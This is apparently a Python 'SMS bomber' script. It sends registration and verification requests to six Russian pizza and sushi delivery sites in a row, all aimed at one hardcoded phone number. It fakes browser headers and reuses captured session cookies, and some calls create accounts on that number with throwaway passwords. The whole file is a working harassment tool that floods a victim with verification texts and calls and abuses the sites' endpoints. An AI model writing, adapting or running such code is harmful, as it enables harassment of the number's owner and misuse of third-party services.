import requests
from pprint import pprint
PHONE = "79519611971"
def serv1():
    try:
        headers = {
            'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'Connection': 'keep-alive',
            'Origin': 'https://surgut.hans-pizza.ru',
            'Referer': 'https://surgut.hans-pizza.ru/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'accept': 'application/json',
            'content-type': 'application/json',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'x-hans-city-code': 'surgut',
            'x-hans-client-id': '1ec5dcb0-7e0c-4989-9194-536afaf04c1c',
            'x-hans-device-type': 'site',
            'x-hans-version-app': '1.2.3',
        }
        json_data = {
            'phone': PHONE,
        }
        response = requests.post('https://api.hans-pizza.ru/api/auth/send', headers=headers, json=json_data)
        print(response.json())
    except:
        print(1)
def serv2():
    cookies = {
    'PHPSESSID': 'D6jy0b5et4XMzOd3Pfyl6nEYgHoWLcti',
    'BITRIX_SM_GUEST_ID': '9997268',
    'BITRIX_SM_SALE_UID': '30d55355ae31bf2400171fc22c745cd2',
    'tmr_lvid': 'ad7484de010daeeef60b5adc6aa211a2',
    'tmr_lvidTS': '1773754265042',
    '_ym_uid': '1773754265303821514',
    '_ym_visorc': 'w',
    'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1773773940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',
    '_ym_isad': '2',
    'domain_sid': 'zgUD5bGrrpXNKfRVSNr2N%3A1773754266288',
    '_ym_d': '1773754267',
    'BITRIX_SM_LAST_VISIT': '17.03.2026%2018%3A31%3A07',
    'tmr_detect': '0%7C1773754268138',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://lv-pizza.ru',
        'priority': 'u=1, i',
        'referer': 'https://lv-pizza.ru/?srsltid=AfmBOoqScpWn1AFIYx5SxAMJjtIHEQ1tIaTk-CDdK_dwjR8HQ7zM47zr',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
        # 'cookie': 'PHPSESSID=D6jy0b5et4XMzOd3Pfyl6nEYgHoWLcti; BITRIX_SM_GUEST_ID=9997268; BITRIX_SM_SALE_UID=30d55355ae31bf2400171fc22c745cd2; tmr_lvid=ad7484de010daeeef60b5adc6aa211a2; tmr_lvidTS=1773754265042; _ym_uid=1773754265303821514; _ym_visorc=w; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1773773940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; domain_sid=zgUD5bGrrpXNKfRVSNr2N%3A1773754266288; _ym_d=1773754267; BITRIX_SM_LAST_VISIT=17.03.2026%2018%3A31%3A07; tmr_detect=0%7C1773754268138',
    }

    data = f'phone=%2B{PHONE[0]}+({PHONE[1:4]})+{PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}&action=send&call=Y&zone=Asia%2FYekaterinburg'
    print(data)
    response = requests.post('https://lv-pizza.ru/ajax/sms_new.php', cookies=cookies, headers=headers, data=data)
    print(response.json())
def serv3():
    cookies = {
    '_yasc': 'q61SnbQS2bO/XNPk7P2m0NPsFA+s2b+1EtaR+UsgzY6wPC5hbkwRp8oLhtTOA8w=',
    '_ga': 'GA1.2.585135803.1773755323',
    '_gid': 'GA1.2.1050422689.1773755324',
    '_gat_gtag_UA_222882258_1': '1',
    '_ym_uid': '1773755324716996701',
    '_ym_d': '1773755324',
    '_ym_isad': '2',
    '_ym_visorc': 'b',
    'analytic_id': '1773755324564593',
    '_ga_40TSJRCTXV': 'GS2.1.s1773755323$o1$g1$t1773755330$j53$l0$h0',
    }
    headers = {
        'accept': 'application/json',
        'accept-language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://papajohns.ru',
        'priority': 'u=1, i',
        'referer': 'https://papajohns.ru/',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
        # 'cookie': '_yasc=q61SnbQS2bO/XNPk7P2m0NPsFA+s2b+1EtaR+UsgzY6wPC5hbkwRp8oLhtTOA8w=; _ga=GA1.2.585135803.1773755323; _gid=GA1.2.1050422689.1773755324; _gat_gtag_UA_222882258_1=1; _ym_uid=1773755324716996701; _ym_d=1773755324; _ym_isad=2; _ym_visorc=b; analytic_id=1773755324564593; _ga_40TSJRCTXV=GS2.1.s1773755323$o1$g1$t1773755330$j53$l0$h0',
    }
    json_data = {
        'phone': f'+{PHONE}',
        'platform': 'web',
        'city_id': '261',
        'lang': 'ru',
    }
    response = requests.post('https://api.papajohns.ru/v2/user/signup-by-phone', cookies=cookies, headers=headers, json=json_data)
    print(response.json())
def serv4():
    cookies = {
    '_ym_uid': '1773755867480796644',
    '_ym_d': '1773755867',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
    'mgo_uid': 'WihPLeMlRTJl0InA002m',
    'mgo_cnt': '1',
    'mgo_sid': 'w00atc1qsc11001nc2lq',
    }
    headers = {
        'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
        'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://tochka-vkusa.ru',
        'Referer': 'https://tochka-vkusa.ru/catalog/pizza',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        # 'Cookie': '_ym_uid=1773755867480796644; _ym_d=1773755867; _ym_isad=2; _ym_visorc=w; mgo_uid=WihPLeMlRTJl0InA002m; mgo_cnt=1; mgo_sid=w00atc1qsc11001nc2lq',
    }
    json_data = {
        'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
        'password': 'Fadka333',
        'passwordReply': 'Fadka333',
    }
    response = requests.put('https://tochka-vkusa.ru/api/registration', cookies=cookies, headers=headers, json=json_data)
    print(response.json())
def serv5():
    cookies = {
        '_ym_uid': '1773840971236173969',
        '_ym_d': '1773840971',
        '_ym_isad': '2',
        'connect.sid': 's%3AGTUjtP2Ic03GN9ZbAUvtnGr5P8btsOy6.oiAFDpJVxEBPUL4fP%2FxZS4C33Ma8kzfuc2qhLt1gA0k',
        '_ym_visorc': 'w',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': 'application/json, text/plain, */*, application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'Origin': 'https://arigatosurgut.com',
        'Connection': 'keep-alive',
        'Referer': 'https://arigatosurgut.com/',
        # 'Cookie': '_ym_uid=1773840971236173969; _ym_d=1773840971; _ym_isad=2; connect.sid=s%3AGTUjtP2Ic03GN9ZbAUvtnGr5P8btsOy6.oiAFDpJVxEBPUL4fP%2FxZS4C33Ma8kzfuc2qhLt1gA0k; _ym_visorc=w',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0',
    }

    json_data = {
        'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}",
        'password': 'qwerty',
        'passwordReply': 'qwerty',
    }

    response = requests.put('https://arigatosurgut.com/api/registration', cookies=cookies, headers=headers, json=json_data)
    print(response.json())
def serv6():

    cookies = {
        'uuid': '73980358-807f-1b98-0c35-cef10a3b8d14',
        'encodedIP': 'dKlKmBfXaAnAmThBrIfFoLrTaA',
        'i18n_redirected': 'ru',
        'theme': 'light',
        'city_id': '1',
        'department_id': '0',
        'delivery_type': 'delivery',
        '_ym_uid': '1773846500943348776',
        '_ym_d': '1773846500',
        '_ym_isad': '2',
        '__session__id': '165570024269babfe430f0c0.21211349',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Referer': 'https://tichpizza.ru/krasnoyarsk',
        'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=4a16bbd621ce4e2589fbaa08b87cd91c,sentry-org_id=4504076812025856,sentry-transaction=%2F%3Acity%2F%3Acatalog(.*)*,sentry-sampled=false,sentry-sample_rand=0.7503387247392285,sentry-sample_rate=0.25',
        'content-type': 'application/json',
        'sentry-trace': '4a16bbd621ce4e2589fbaa08b87cd91c-9da4f11f0e469a3b-0',
        'sitenew': '1',
        'uuid': '73980358-807f-1b98-0c35-cef10a3b8d14',
        'x-api-key': '12773774',
        'x-brand-id': '1',
        'x-platform': 'ssr',
        'Origin': 'https://tichpizza.ru',
        'Connection': 'keep-alive',
        # 'Cookie': 'uuid=73980358-807f-1b98-0c35-cef10a3b8d14; encodedIP=dKlKmBfXaAnAmThBrIfFoLrTaA; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; _ym_uid=1773846500943348776; _ym_d=1773846500; _ym_isad=2; __session__id=165570024269babfe430f0c0.21211349',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    json_data = {
        'phone': PHONE[1:],
        'verify_type': 'call',
    }

    response = requests.post('https://tichpizza.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
    print(response.json())
serv1()
serv2()
serv3()
serv4()
serv5()
serv6()